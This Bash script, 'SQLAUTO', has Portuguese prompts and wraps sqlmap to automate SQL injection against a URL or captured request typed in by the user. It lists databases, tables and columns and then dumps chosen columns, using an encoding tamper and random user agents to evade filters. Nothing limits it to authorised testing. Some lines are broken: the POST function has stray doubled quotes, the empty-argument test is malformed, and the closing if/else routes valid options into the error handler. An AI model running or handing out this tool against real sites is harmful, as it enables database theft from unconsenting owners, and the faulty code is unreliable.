#!/bin/bash

function banner()
{
echo "[+] - SQLAUTO - [+]"
echo "[+] - - - - - - - - - - - - - - - - - [+]"
echo "[+] - Coded by Matheus Bernardes - [+]"
echo "[+] - gambler@tutanota.com  - [+]"
echo " "
}

function ajuda()
{
        banner
        echo "[+] - Modo de uso - [+]"
        echo " "

        echo "[+] - Ataques através de URL (Metodo GET) - [+]"
        echo "$0 -get"
        echo " "

        echo "[+] - Ataques através de Arquivo com Request (Metodo POST) - [+]"
        echo "$0 -post"
        echo " "

        echo "[+] - Menu de ajuda = [+]"
        echo "$0 -h"
        exit
}

function erro()
{
        echo "[+] Erro de sintaxe - [+]"
        echo " "
        ajuda
}

function get()
{
        echo "[+] - Digite a URL a ser explorada: "
        read url
        sqlmap -u "$url" --tamper="charencode.py" --random-agent --dbs

        echo "[+] - Digite o Banco de Dados a ser explorado: "
        read db
        sqlmap -u "$url" --tamper="charencode.py" --random-agent -D $db --tables

        echo "[+] - Digite a Tabela a ser explorada: "
        read tabela
        sqlmap -u "$url" --tamper="charencode.py" --random-agent -D $db -T $tabela --columns

        echo "[+] - Digite a(s) coluna(s) a ser explora(s): "
        read colunas
        sqlmap -u "$url" --tamper="charencode.py" --random-agent -D $db -T $tabela -C $colunas --dump
}

function post()
{
        echo "[+] - Digite o caminho completo do arquivo com a requisição a ser explorada: "
        read arquivo
        sqlmap -r "$arquivo" --tamper="charencode.py" --random-agent --dbs

        echo "[+] - Digite o Banco de Dados a ser explorado: "
        read db
        sqlmap -r "$arquivo"" --tamper="charencode.py" --random-agent -D $db --tables

        echo "[+] - Digite a Tabela a ser explorada: "
        read tabela
        sqlmap -r "$arquivo"" --tamper="charencode.py" --random-agent -D $db -T $tabela --columns

        echo "[+] - Digite a(s) coluna(s) a ser explora(s): "
        read colunas
        sqlmap -r "$arquivo" --tamper="charencode.py" --random-agent -D $db -T $tabela -C $colunas --dump
}

if [ $1 -z ]
then
        erro
fi

if [ $1 == '-h' ]
then
        ajuda
fi

if [ $1 == '-get' ]
then
        get
fi

if [ $1 == '-post' ]
then
        post
else
        erro
fi
